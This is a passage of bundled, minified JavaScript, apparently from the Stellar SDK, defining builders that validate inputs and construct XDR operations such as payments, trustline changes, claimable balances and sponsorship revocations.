    Object.defineProperty(account_merge, "__esModule", {
        value: !0
    }),
    account_merge.accountMerge = O;
    var _ = j(requireXdr())
      , M = requireDecode_encode_muxed_account();
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        var w = {};
        try {
            w.body = _.default.OperationBody.accountMerge((0,
            M.decodeAddressToMuxedAccount)(x.destination))
        } catch {
            throw new Error("destination is invalid")
        }
        return this.setSourceAccount(w, x),
        new _.default.Operation(w)
    }
    return account_merge
}
var allow_trust = {}, hasRequiredAllow_trust;
function requireAllow_trust() {
    if (hasRequiredAllow_trust)
        return allow_trust;
    hasRequiredAllow_trust = 1,
    Object.defineProperty(allow_trust, "__esModule", {
        value: !0
    }),
    allow_trust.allowTrust = x;
    var _ = O(requireXdr())
      , M = requireKeypair()
      , j = requireStrkey();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        if (!j.StrKey.isValidEd25519PublicKey(w.trustor))
            throw new Error("trustor is invalid");
        var b = {};
        if (b.trustor = M.Keypair.fromPublicKey(w.trustor).xdrAccountId(),
        w.assetCode.length <= 4) {
            var X = w.assetCode.padEnd(4, "\0");
            b.asset = _.default.AssetCode.assetTypeCreditAlphanum4(X)
        } else if (w.assetCode.length <= 12) {
            var Y = w.assetCode.padEnd(12, "\0");
            b.asset = _.default.AssetCode.assetTypeCreditAlphanum12(Y)
        } else
            throw new Error("Asset code must be 12 characters at max.");
        typeof w.authorize == "boolean" ? w.authorize ? b.authorize = _.default.TrustLineFlags.authorizedFlag().value : b.authorize = 0 : b.authorize = w.authorize;
        var F = new _.default.AllowTrustOp(b)
          , V = {};
        return V.body = _.default.OperationBody.allowTrust(F),
        this.setSourceAccount(V, w),
        new _.default.Operation(V)
    }
    return allow_trust
}
var bump_sequence = {}, hasRequiredBump_sequence;
function requireBump_sequence() {
    if (hasRequiredBump_sequence)
        return bump_sequence;
    hasRequiredBump_sequence = 1,
    Object.defineProperty(bump_sequence, "__esModule", {
        value: !0
    }),
    bump_sequence.bumpSequence = x;
    var _ = requireXdr$1()
      , M = O(requireBignumber())
      , j = O(requireXdr());
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        var b = {};
        if (typeof w.bumpTo != "string")
            throw new Error("bumpTo must be a string");
        try {
            new M.default(w.bumpTo)
        } catch {
            throw new Error("bumpTo must be a stringified number")
        }
        b.bumpTo = _.Hyper.fromString(w.bumpTo);
        var X = new j.default.BumpSequenceOp(b)
          , Y = {};
        return Y.body = j.default.OperationBody.bumpSequence(X),
        this.setSourceAccount(Y, w),
        new j.default.Operation(Y)
    }
    return bump_sequence
}
var change_trust = {}, hasRequiredChange_trust;
function requireChange_trust() {
    if (hasRequiredChange_trust)
        return change_trust;
    hasRequiredChange_trust = 1,
    Object.defineProperty(change_trust, "__esModule", {
        value: !0
    }),
    change_trust.changeTrust = X;
    var _ = requireXdr$1()
      , M = w(requireBignumber())
      , j = w(requireXdr())
      , O = requireAsset()
      , x = requireLiquidity_pool_asset();
    function w(Y) {
        return Y && Y.__esModule ? Y : {
            default: Y
        }
    }
    var b = "9223372036854775807";
    function X(Y) {
        var F = {};
        if (Y.asset instanceof O.Asset)
            F.line = Y.asset.toChangeTrustXDRObject();
        else if (Y.asset instanceof x.LiquidityPoolAsset)
            F.line = Y.asset.toXDRObject();
        else
            throw new TypeError("asset must be Asset or LiquidityPoolAsset");
        if (Y.limit !== void 0 && !this.isValidAmount(Y.limit, !0))
            throw new TypeError(this.constructAmountRequirementsError("limit"));
        Y.limit ? F.limit = this._toXDRAmount(Y.limit) : F.limit = _.Hyper.fromString(new M.default(b).toString()),
        Y.source && (F.source = Y.source.masterKeypair);
        var V = new j.default.ChangeTrustOp(F)
          , K = {};
        return K.body = j.default.OperationBody.changeTrust(V),
        this.setSourceAccount(K, Y),
        new j.default.Operation(K)
    }
    return change_trust
}
var create_account = {}, hasRequiredCreate_account;
function requireCreate_account() {
    if (hasRequiredCreate_account)
        return create_account;
    hasRequiredCreate_account = 1,
    Object.defineProperty(create_account, "__esModule", {
        value: !0
    }),
    create_account.createAccount = x;
    var _ = O(requireXdr())
      , M = requireKeypair()
      , j = requireStrkey();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x(w) {
        if (!j.StrKey.isValidEd25519PublicKey(w.destination))
            throw new Error("destination is invalid");
        if (!this.isValidAmount(w.startingBalance, !0))
            throw new TypeError(this.constructAmountRequirementsError("startingBalance"));
        var b = {};
        b.destination = M.Keypair.fromPublicKey(w.destination).xdrAccountId(),
        b.startingBalance = this._toXDRAmount(w.startingBalance);
        var X = new _.default.CreateAccountOp(b)
          , Y = {};
        return Y.body = _.default.OperationBody.createAccount(X),
        this.setSourceAccount(Y, w),
        new _.default.Operation(Y)
    }
    return create_account
}
var create_claimable_balance = {}, hasRequiredCreate_claimable_balance;
function requireCreate_claimable_balance() {
    if (hasRequiredCreate_claimable_balance)
        return create_claimable_balance;
    hasRequiredCreate_claimable_balance = 1,
    Object.defineProperty(create_claimable_balance, "__esModule", {
        value: !0
    }),
    create_claimable_balance.createClaimableBalance = O;
    var _ = j(requireXdr())
      , M = requireAsset();
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        if (!(x.asset instanceof M.Asset))
            throw new Error("must provide an asset for create claimable balance operation");
        if (!this.isValidAmount(x.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        if (!Array.isArray(x.claimants) || x.claimants.length === 0)
            throw new Error("must provide at least one claimant");
        var w = {};
        w.asset = x.asset.toXDRObject(),
        w.amount = this._toXDRAmount(x.amount),
        w.claimants = Object.values(x.claimants).map(function(Y) {
            return Y.toXDRObject()
        });
        var b = new _.default.CreateClaimableBalanceOp(w)
          , X = {};
        return X.body = _.default.OperationBody.createClaimableBalance(b),
        this.setSourceAccount(X, x),
        new _.default.Operation(X)
    }
    return create_claimable_balance
}
var claim_claimable_balance = {}, hasRequiredClaim_claimable_balance;
function requireClaim_claimable_balance() {
    if (hasRequiredClaim_claimable_balance)
        return claim_claimable_balance;
    hasRequiredClaim_claimable_balance = 1,
    Object.defineProperty(claim_claimable_balance, "__esModule", {
        value: !0
    }),
    claim_claimable_balance.claimClaimableBalance = j,
    claim_claimable_balance.validateClaimableBalanceId = O;
    var _ = M(requireXdr());
    function M(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function j() {
        var x = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        O(x.balanceId);
        var w = {};
        w.balanceId = _.default.ClaimableBalanceId.fromXDR(x.balanceId, "hex");
        var b = new _.default.ClaimClaimableBalanceOp(w)
          , X = {};
        return X.body = _.default.OperationBody.claimClaimableBalance(b),
        this.setSourceAccount(X, x),
        new _.default.Operation(X)
    }
    function O(x) {
        if (typeof x != "string" || x.length !== 72)
            throw new Error("must provide a valid claimable balance id")
    }
    return claim_claimable_balance
}
var clawback_claimable_balance = {}, hasRequiredClawback_claimable_balance;
function requireClawback_claimable_balance() {
    if (hasRequiredClawback_claimable_balance)
        return clawback_claimable_balance;
    hasRequiredClawback_claimable_balance = 1,
    Object.defineProperty(clawback_claimable_balance, "__esModule", {
        value: !0
    }),
    clawback_claimable_balance.clawbackClaimableBalance = O;
    var _ = j(requireXdr())
      , M = requireClaim_claimable_balance();
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O() {
        var x = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        (0,
        M.validateClaimableBalanceId)(x.balanceId);
        var w = {
            balanceId: _.default.ClaimableBalanceId.fromXDR(x.balanceId, "hex")
        }
          , b = {
            body: _.default.OperationBody.clawbackClaimableBalance(new _.default.ClawbackClaimableBalanceOp(w))
        };
        return this.setSourceAccount(b, x),
        new _.default.Operation(b)
    }
    return clawback_claimable_balance
}
var inflation = {}, hasRequiredInflation;
function requireInflation() {
    if (hasRequiredInflation)
        return inflation;
    hasRequiredInflation = 1,
    Object.defineProperty(inflation, "__esModule", {
        value: !0
    }),
    inflation.inflation = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j() {
        var O = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , x = {};
        return x.body = _.default.OperationBody.inflation(),
        this.setSourceAccount(x, O),
        new _.default.Operation(x)
    }
    return inflation
}
var manage_data = {}, hasRequiredManage_data;
function requireManage_data() {
    if (hasRequiredManage_data)
        return manage_data;
    hasRequiredManage_data = 1,
    Object.defineProperty(manage_data, "__esModule", {
        value: !0
    }),
    manage_data.manageData = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j(O) {
        var x = {};
        if (!(typeof O.name == "string" && O.name.length <= 64))
            throw new Error("name must be a string, up to 64 characters");
        if (x.dataName = O.name,
        typeof O.value != "string" && !Buffer.isBuffer(O.value) && O.value !== null)
            throw new Error("value must be a string, Buffer or null");
        if (typeof O.value == "string" ? x.dataValue = Buffer.from(O.value) : x.dataValue = O.value,
        x.dataValue !== null && x.dataValue.length > 64)
            throw new Error("value cannot be longer that 64 bytes");
        var w = new _.default.ManageDataOp(x)
          , b = {};
        return b.body = _.default.OperationBody.manageData(w),
        this.setSourceAccount(b, O),
        new _.default.Operation(b)
    }
    return manage_data
}
var manage_buy_offer = {}, hasRequiredManage_buy_offer;
function requireManage_buy_offer() {
    if (hasRequiredManage_buy_offer)
        return manage_buy_offer;
    hasRequiredManage_buy_offer = 1,
    Object.defineProperty(manage_buy_offer, "__esModule", {
        value: !0
    }),
    manage_buy_offer.manageBuyOffer = O;
    var _ = requireXdr$1()
      , M = j(requireXdr());
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        var w = {};
        if (w.selling = x.selling.toXDRObject(),
        w.buying = x.buying.toXDRObject(),
        !this.isValidAmount(x.buyAmount, !0))
            throw new TypeError(this.constructAmountRequirementsError("buyAmount"));
        if (w.buyAmount = this._toXDRAmount(x.buyAmount),
        x.price === void 0)
            throw new TypeError("price argument is required");
        w.price = this._toXDRPrice(x.price),
        x.offerId !== void 0 ? x.offerId = x.offerId.toString() : x.offerId = "0",
        w.offerId = _.Hyper.fromString(x.offerId);
        var b = new M.default.ManageBuyOfferOp(w)
          , X = {};
        return X.body = M.default.OperationBody.manageBuyOffer(b),
        this.setSourceAccount(X, x),
        new M.default.Operation(X)
    }
    return manage_buy_offer
}
var path_payment_strict_receive = {}, hasRequiredPath_payment_strict_receive;
function requirePath_payment_strict_receive() {
    if (hasRequiredPath_payment_strict_receive)
        return path_payment_strict_receive;
    hasRequiredPath_payment_strict_receive = 1,
    Object.defineProperty(path_payment_strict_receive, "__esModule", {
        value: !0
    }),
    path_payment_strict_receive.pathPaymentStrictReceive = O;
    var _ = j(requireXdr())
      , M = requireDecode_encode_muxed_account();
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        switch (!0) {
        case !x.sendAsset:
            throw new Error("Must specify a send asset");
        case !this.isValidAmount(x.sendMax):
            throw new TypeError(this.constructAmountRequirementsError("sendMax"));
        case !x.destAsset:
            throw new Error("Must provide a destAsset for a payment operation");
        case !this.isValidAmount(x.destAmount):
            throw new TypeError(this.constructAmountRequirementsError("destAmount"))
        }
        var w = {};
        w.sendAsset = x.sendAsset.toXDRObject(),
        w.sendMax = this._toXDRAmount(x.sendMax);
        try {
            w.destination = (0,
            M.decodeAddressToMuxedAccount)(x.destination)
        } catch {
            throw new Error("destination is invalid")
        }
        w.destAsset = x.destAsset.toXDRObject(),
        w.destAmount = this._toXDRAmount(x.destAmount);
        var b = x.path ? x.path : [];
        w.path = b.map(function(F) {
            return F.toXDRObject()
        });
        var X = new _.default.PathPaymentStrictReceiveOp(w)
          , Y = {};
        return Y.body = _.default.OperationBody.pathPaymentStrictReceive(X),
        this.setSourceAccount(Y, x),
        new _.default.Operation(Y)
    }
    return path_payment_strict_receive
}
var path_payment_strict_send = {}, hasRequiredPath_payment_strict_send;
function requirePath_payment_strict_send() {
    if (hasRequiredPath_payment_strict_send)
        return path_payment_strict_send;
    hasRequiredPath_payment_strict_send = 1,
    Object.defineProperty(path_payment_strict_send, "__esModule", {
        value: !0
    }),
    path_payment_strict_send.pathPaymentStrictSend = O;
    var _ = j(requireXdr())
      , M = requireDecode_encode_muxed_account();
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        switch (!0) {
        case !x.sendAsset:
            throw new Error("Must specify a send asset");
        case !this.isValidAmount(x.sendAmount):
            throw new TypeError(this.constructAmountRequirementsError("sendAmount"));
        case !x.destAsset:
            throw new Error("Must provide a destAsset for a payment operation");
        case !this.isValidAmount(x.destMin):
            throw new TypeError(this.constructAmountRequirementsError("destMin"))
        }
        var w = {};
        w.sendAsset = x.sendAsset.toXDRObject(),
        w.sendAmount = this._toXDRAmount(x.sendAmount);
        try {
            w.destination = (0,
            M.decodeAddressToMuxedAccount)(x.destination)
        } catch {
            throw new Error("destination is invalid")
        }
        w.destAsset = x.destAsset.toXDRObject(),
        w.destMin = this._toXDRAmount(x.destMin);
        var b = x.path ? x.path : [];
        w.path = b.map(function(F) {
            return F.toXDRObject()
        });
        var X = new _.default.PathPaymentStrictSendOp(w)
          , Y = {};
        return Y.body = _.default.OperationBody.pathPaymentStrictSend(X),
        this.setSourceAccount(Y, x),
        new _.default.Operation(Y)
    }
    return path_payment_strict_send
}
var payment = {}, hasRequiredPayment;
function requirePayment() {
    if (hasRequiredPayment)
        return payment;
    hasRequiredPayment = 1,
    Object.defineProperty(payment, "__esModule", {
        value: !0
    }),
    payment.payment = O;
    var _ = j(requireXdr())
      , M = requireDecode_encode_muxed_account();
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        if (!x.asset)
            throw new Error("Must provide an asset for a payment operation");
        if (!this.isValidAmount(x.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        var w = {};
        try {
            w.destination = (0,
            M.decodeAddressToMuxedAccount)(x.destination)
        } catch {
            throw new Error("destination is invalid")
        }
        w.asset = x.asset.toXDRObject(),
        w.amount = this._toXDRAmount(x.amount);
        var b = new _.default.PaymentOp(w)
          , X = {};
        return X.body = _.default.OperationBody.payment(b),
        this.setSourceAccount(X, x),
        new _.default.Operation(X)
    }
    return payment
}
var set_options = {}, hasRequiredSet_options;
function requireSet_options() {
    if (hasRequiredSet_options)
        return set_options;
    hasRequiredSet_options = 1,
    Object.defineProperty(set_options, "__esModule", {
        value: !0
    }),
    set_options.setOptions = w;
    var _ = O(requireXdr())
      , M = requireKeypair()
      , j = requireStrkey();
    function O(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    function x(b, X) {
        if (b >= 0 && b <= 255)
            return !0;
        throw new Error("".concat(X, " value must be between 0 and 255"))
    }
    function w(b) {
        var X = {};
        if (b.inflationDest) {
            if (!j.StrKey.isValidEd25519PublicKey(b.inflationDest))
                throw new Error("inflationDest is invalid");
            X.inflationDest = M.Keypair.fromPublicKey(b.inflationDest).xdrAccountId()
        }
        if (X.clearFlags = this._checkUnsignedIntValue("clearFlags", b.clearFlags),
        X.setFlags = this._checkUnsignedIntValue("setFlags", b.setFlags),
        X.masterWeight = this._checkUnsignedIntValue("masterWeight", b.masterWeight, x),
        X.lowThreshold = this._checkUnsignedIntValue("lowThreshold", b.lowThreshold, x),
        X.medThreshold = this._checkUnsignedIntValue("medThreshold", b.medThreshold, x),
        X.highThreshold = this._checkUnsignedIntValue("highThreshold", b.highThreshold, x),
        b.homeDomain !== void 0 && typeof b.homeDomain != "string")
            throw new TypeError("homeDomain argument must be of type String");
        if (X.homeDomain = b.homeDomain,
        b.signer) {
            var Y = this._checkUnsignedIntValue("signer.weight", b.signer.weight, x), F, V = 0;
            if (b.signer.ed25519PublicKey) {
                if (!j.StrKey.isValidEd25519PublicKey(b.signer.ed25519PublicKey))
                    throw new Error("signer.ed25519PublicKey is invalid.");
                var K = j.StrKey.decodeEd25519PublicKey(b.signer.ed25519PublicKey);
                F = new _.default.SignerKey.signerKeyTypeEd25519(K),
                V += 1
            }
            if (b.signer.preAuthTx) {
                if (typeof b.signer.preAuthTx == "string" && (b.signer.preAuthTx = Buffer.from(b.signer.preAuthTx, "hex")),
                !(Buffer.isBuffer(b.signer.preAuthTx) && b.signer.preAuthTx.length === 32))
                    throw new Error("signer.preAuthTx must be 32 bytes Buffer.");
                F = new _.default.SignerKey.signerKeyTypePreAuthTx(b.signer.preAuthTx),
                V += 1
            }
            if (b.signer.sha256Hash) {
                if (typeof b.signer.sha256Hash == "string" && (b.signer.sha256Hash = Buffer.from(b.signer.sha256Hash, "hex")),
                !(Buffer.isBuffer(b.signer.sha256Hash) && b.signer.sha256Hash.length === 32))
                    throw new Error("signer.sha256Hash must be 32 bytes Buffer.");
                F = new _.default.SignerKey.signerKeyTypeHashX(b.signer.sha256Hash),
                V += 1
            }
            if (b.signer.ed25519SignedPayload) {
                if (!j.StrKey.isValidSignedPayload(b.signer.ed25519SignedPayload))
                    throw new Error("signer.ed25519SignedPayload is invalid.");
                var Q = j.StrKey.decodeSignedPayload(b.signer.ed25519SignedPayload)
                  , ee = _.default.SignerKeyEd25519SignedPayload.fromXDR(Q);
                F = _.default.SignerKey.signerKeyTypeEd25519SignedPayload(ee),
                V += 1
            }
            if (V !== 1)
                throw new Error("Signer object must contain exactly one of signer.ed25519PublicKey, signer.sha256Hash, signer.preAuthTx.");
            X.signer = new _.default.Signer({
                key: F,
                weight: Y
            })
        }
        var ae = new _.default.SetOptionsOp(X)
          , ne = {};
        return ne.body = _.default.OperationBody.setOptions(ae),
        this.setSourceAccount(ne, b),
        new _.default.Operation(ne)
    }
    return set_options
}
var begin_sponsoring_future_reserves = {}, hasRequiredBegin_sponsoring_future_reserves;
function requireBegin_sponsoring_future_reserves() {
    if (hasRequiredBegin_sponsoring_future_reserves)
        return begin_sponsoring_future_reserves;
    hasRequiredBegin_sponsoring_future_reserves = 1,
    Object.defineProperty(begin_sponsoring_future_reserves, "__esModule", {
        value: !0
    }),
    begin_sponsoring_future_reserves.beginSponsoringFutureReserves = x;
    var _ = O(requireXdr())
      , M = requireStrkey()
      , j = requireKeypair();
    function O(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function x() {
        var w = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!M.StrKey.isValidEd25519PublicKey(w.sponsoredId))
            throw new Error("sponsoredId is invalid");
        var b = new _.default.BeginSponsoringFutureReservesOp({
            sponsoredId: j.Keypair.fromPublicKey(w.sponsoredId).xdrAccountId()
        })
          , X = {};
        return X.body = _.default.OperationBody.beginSponsoringFutureReserves(b),
        this.setSourceAccount(X, w),
        new _.default.Operation(X)
    }
    return begin_sponsoring_future_reserves
}
var end_sponsoring_future_reserves = {}, hasRequiredEnd_sponsoring_future_reserves;
function requireEnd_sponsoring_future_reserves() {
    if (hasRequiredEnd_sponsoring_future_reserves)
        return end_sponsoring_future_reserves;
    hasRequiredEnd_sponsoring_future_reserves = 1,
    Object.defineProperty(end_sponsoring_future_reserves, "__esModule", {
        value: !0
    }),
    end_sponsoring_future_reserves.endSponsoringFutureReserves = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j() {
        var O = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , x = {};
        return x.body = _.default.OperationBody.endSponsoringFutureReserves(),
        this.setSourceAccount(x, O),
        new _.default.Operation(x)
    }
    return end_sponsoring_future_reserves
}
var revoke_sponsorship = {}, hasRequiredRevoke_sponsorship;
function requireRevoke_sponsorship() {
    if (hasRequiredRevoke_sponsorship)
        return revoke_sponsorship;
    hasRequiredRevoke_sponsorship = 1,
    Object.defineProperty(revoke_sponsorship, "__esModule", {
        value: !0
    }),
    revoke_sponsorship.revokeAccountSponsorship = b,
    revoke_sponsorship.revokeClaimableBalanceSponsorship = V,
    revoke_sponsorship.revokeDataSponsorship = F,
    revoke_sponsorship.revokeLiquidityPoolSponsorship = K,
    revoke_sponsorship.revokeOfferSponsorship = Y,
    revoke_sponsorship.revokeSignerSponsorship = Q,
    revoke_sponsorship.revokeTrustlineSponsorship = X;
    var _ = w(requireXdr())
      , M = requireStrkey()
      , j = requireKeypair()
      , O = requireAsset()
      , x = requireLiquidity_pool_id();
    function w(ee) {
        return ee && ee.__esModule ? ee : {
            default: ee
        }
    }
    function b() {
        var ee = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!M.StrKey.isValidEd25519PublicKey(ee.account))
            throw new Error("account is invalid");
        var ae = _.default.LedgerKey.account(new _.default.LedgerKeyAccount({
            accountId: j.Keypair.fromPublicKey(ee.account).xdrAccountId()
        }))
          , ne = _.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ae)
          , oe = {};
        return oe.body = _.default.OperationBody.revokeSponsorship(ne),
        this.setSourceAccount(oe, ee),
        new _.default.Operation(oe)
    }
    function X() {
        var ee = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!M.StrKey.isValidEd25519PublicKey(ee.account))
            throw new Error("account is invalid");
        var ae;
        if (ee.asset instanceof O.Asset)
            ae = ee.asset.toTrustLineXDRObject();
        else if (ee.asset instanceof x.LiquidityPoolId)
            ae = ee.asset.toXDRObject();
        else
            throw new TypeError("asset must be an Asset or LiquidityPoolId");
        var ne = _.default.LedgerKey.trustline(new _.default.LedgerKeyTrustLine({
            accountId: j.Keypair.fromPublicKey(ee.account).xdrAccountId(),
            asset: ae
        }))
          , oe = _.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ne)
          , ue = {};
        return ue.body = _.default.OperationBody.revokeSponsorship(oe),
        this.setSourceAccount(ue, ee),
        new _.default.Operation(ue)
    }
    function Y() {
        var ee = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!M.StrKey.isValidEd25519PublicKey(ee.seller))
            throw new Error("seller is invalid");
        if (typeof ee.offerId != "string")
            throw new Error("offerId is invalid");
        var ae = _.default.LedgerKey.offer(new _.default.LedgerKeyOffer({
            sellerId: j.Keypair.fromPublicKey(ee.seller).xdrAccountId(),
            offerId: _.default.Int64.fromString(ee.offerId)
        }))
          , ne = _.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ae)
          , oe = {};
        return oe.body = _.default.OperationBody.revokeSponsorship(ne),
        this.setSourceAccount(oe, ee),
        new _.default.Operation(oe)
    }
    function F() {
        var ee = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!M.StrKey.isValidEd25519PublicKey(ee.account))
            throw new Error("account is invalid");
        if (typeof ee.name != "string" || ee.name.length > 64)
            throw new Error("name must be a string, up to 64 characters");
        var ae = _.default.LedgerKey.data(new _.default.LedgerKeyData({
            accountId: j.Keypair.fromPublicKey(ee.account).xdrAccountId(),
            dataName: ee.name
        }))
          , ne = _.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ae)
          , oe = {};
        return oe.body = _.default.OperationBody.revokeSponsorship(ne),
        this.setSourceAccount(oe, ee),
        new _.default.Operation(oe)
    }
    function V() {
        var ee = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (typeof ee.balanceId != "string")
            throw new Error("balanceId is invalid");
        var ae = _.default.LedgerKey.claimableBalance(new _.default.LedgerKeyClaimableBalance({
            balanceId: _.default.ClaimableBalanceId.fromXDR(ee.balanceId, "hex")
        }))
          , ne = _.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ae)
          , oe = {};
        return oe.body = _.default.OperationBody.revokeSponsorship(ne),
        this.setSourceAccount(oe, ee),
        new _.default.Operation(oe)
    }
    function K() {
        var ee = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (typeof ee.liquidityPoolId != "string")
            throw new Error("liquidityPoolId is invalid");
        var ae = _.default.LedgerKey.liquidityPool(new _.default.LedgerKeyLiquidityPool({
            liquidityPoolId: _.default.PoolId.fromXDR(ee.liquidityPoolId, "hex")
        }))
          , ne = _.default.RevokeSponsorshipOp.revokeSponsorshipLedgerEntry(ae)
          , oe = {
            body: _.default.OperationBody.revokeSponsorship(ne)
        };
        return this.setSourceAccount(oe, ee),
        new _.default.Operation(oe)
    }
    function Q() {
        var ee = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {};
        if (!M.StrKey.isValidEd25519PublicKey(ee.account))
            throw new Error("account is invalid");
        var ae;
        if (ee.signer.ed25519PublicKey) {
            if (!M.StrKey.isValidEd25519PublicKey(ee.signer.ed25519PublicKey))
                throw new Error("signer.ed25519PublicKey is invalid.");
            var ne = M.StrKey.decodeEd25519PublicKey(ee.signer.ed25519PublicKey);
            ae = new _.default.SignerKey.signerKeyTypeEd25519(ne)
        } else if (ee.signer.preAuthTx) {
            var oe;
            if (typeof ee.signer.preAuthTx == "string" ? oe = Buffer.from(ee.signer.preAuthTx, "hex") : oe = ee.signer.preAuthTx,
            !(Buffer.isBuffer(oe) && oe.length === 32))
                throw new Error("signer.preAuthTx must be 32 bytes Buffer.");
            ae = new _.default.SignerKey.signerKeyTypePreAuthTx(oe)
        } else if (ee.signer.sha256Hash) {
            var ue;
            if (typeof ee.signer.sha256Hash == "string" ? ue = Buffer.from(ee.signer.sha256Hash, "hex") : ue = ee.signer.sha256Hash,
            !(Buffer.isBuffer(ue) && ue.length === 32))
                throw new Error("signer.sha256Hash must be 32 bytes Buffer.");
            ae = new _.default.SignerKey.signerKeyTypeHashX(ue)
        } else
            throw new Error("signer is invalid");
        var fe = new _.default.RevokeSponsorshipOpSigner({
            accountId: j.Keypair.fromPublicKey(ee.account).xdrAccountId(),
            signerKey: ae
        })
          , he = _.default.RevokeSponsorshipOp.revokeSponsorshipSigner(fe)
          , pe = {};
        return pe.body = _.default.OperationBody.revokeSponsorship(he),
        this.setSourceAccount(pe, ee),
        new _.default.Operation(pe)
    }
    return revoke_sponsorship
}
var clawback = {}, hasRequiredClawback;
function requireClawback() {
    if (hasRequiredClawback)
        return clawback;
    hasRequiredClawback = 1,
    Object.defineProperty(clawback, "__esModule", {
        value: !0
    }),
    clawback.clawback = O;
    var _ = j(requireXdr())
      , M = requireDecode_encode_muxed_account();
    function j(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    function O(x) {
        var w = {};
        if (!this.isValidAmount(x.amount))
            throw new TypeError(this.constructAmountRequirementsError("amount"));
        w.amount = this._toXDRAmount(x.amount),
        w.asset = x.asset.toXDRObject();
        try {
            w.from = (0,
            M.decodeAddressToMuxedAccount)(x.from)
        } catch {
            throw new Error("from address is invalid")
        }
        var b = {
            body: _.default.OperationBody.clawback(new _.default.ClawbackOp(w))
        };
        return this.setSourceAccount(b, x),
        new _.default.Operation(b)
    }
    return clawback
}
var set_trustline_flags = {}, hasRequiredSet_trustline_flags;
function requireSet_trustline_flags() {
    if (hasRequiredSet_trustline_flags)
        return set_trustline_flags;
    hasRequiredSet_trustline_flags = 1,
    Object.defineProperty(set_trustline_flags, "__esModule", {
        value: !0
    }),
    set_trustline_flags.setTrustLineFlags = x;
    var _ = j(requireXdr())
      , M = requireKeypair();
    function j(w) {
        return w && w.__esModule ? w : {
            default: w
        }
    }
    function O(w) {
        "@babel/helpers - typeof";
        return O = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(b) {
            return typeof b
        }
        : function(b) {
            return b && typeof Symbol == "function" && b.constructor === Symbol && b !== Symbol.prototype ? "symbol" : typeof b
        }
        ,
        O(w)
    }
    function x() {
        var w = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , b = {};
        if (O(w.flags) !== "object" || Object.keys(w.flags).length === 0)
            throw new Error("opts.flags must be a map of boolean flags to modify");
        var X = {
            authorized: _.default.TrustLineFlags.authorizedFlag(),
            authorizedToMaintainLiabilities: _.default.TrustLineFlags.authorizedToMaintainLiabilitiesFlag(),
            clawbackEnabled: _.default.TrustLineFlags.trustlineClawbackEnabledFlag()
        }
          , Y = 0
          , F = 0;
        Object.keys(w.flags).forEach(function(K) {
            if (!Object.prototype.hasOwnProperty.call(X, K))
                throw new Error("unsupported flag name specified: ".concat(K));
            var Q = w.flags[K]
              , ee = X[K].value;
            Q === !0 ? F |= ee : Q === !1 && (Y |= ee)
        }),
        b.trustor = M.Keypair.fromPublicKey(w.trustor).xdrAccountId(),
        b.asset = w.asset.toXDRObject(),
        b.clearFlags = Y,
        b.setFlags = F;
        var V = {
            body: _.default.OperationBody.setTrustLineFlags(new _.default.SetTrustLineFlagsOp(b))
        };
        return this.setSourceAccount(V, w),
        new _.default.Operation(V)
    }
    return set_trustline_flags
}
var liquidity_pool_deposit = {}, hasRequiredLiquidity_pool_deposit;
function requireLiquidity_pool_deposit() {
    if (hasRequiredLiquidity_pool_deposit)
        return liquidity_pool_deposit;
    hasRequiredLiquidity_pool_deposit = 1,
    Object.defineProperty(liquidity_pool_deposit, "__esModule", {
        value: !0
    }),
    liquidity_pool_deposit.liquidityPoolDeposit = j;
    var _ = M(requireXdr());
    function M(O) {
        return O && O.__esModule ? O : {
            default: O
        }
    }
    function j() {
        var O = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : {}
          , x = O.liquidityPoolId
          , w = O.maxAmountA
          , b = O.maxAmountB
          , X = O.minPrice
          , Y = O.maxPrice
          , F = {};
        if (!x)
            throw new TypeError("liquidityPoolId argument is required");
        if (F.liquidityPoolId = _.default.PoolId.fromXDR(x, "hex"),
        !this.isValidAmount(w, !0))
            throw new TypeError(this.constructAmountRequirementsError("maxAmountA"));
